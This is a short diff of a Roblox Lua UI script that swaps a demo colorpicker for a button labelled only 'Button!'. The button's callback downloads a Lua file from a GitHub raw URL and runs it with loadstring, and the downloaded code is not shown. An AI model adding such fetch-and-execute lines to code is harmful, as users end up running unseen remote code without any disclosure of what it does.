@@ -7,10 +7,9 @@ local Tab = Window:MakeTab({
 	PremiumOnly = false
 })
 
-Tab:AddColorpicker({
-	Name = "Colorpicker",
-	Default = Color3.fromRGB(255, 0, 0),
-	Callback = function(Value)
-		print(Value)
-	end	  
+Tab:AddButton({
+	Name = "Button!",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/any/main/skdpo.lua"))();
+  	end    
 })
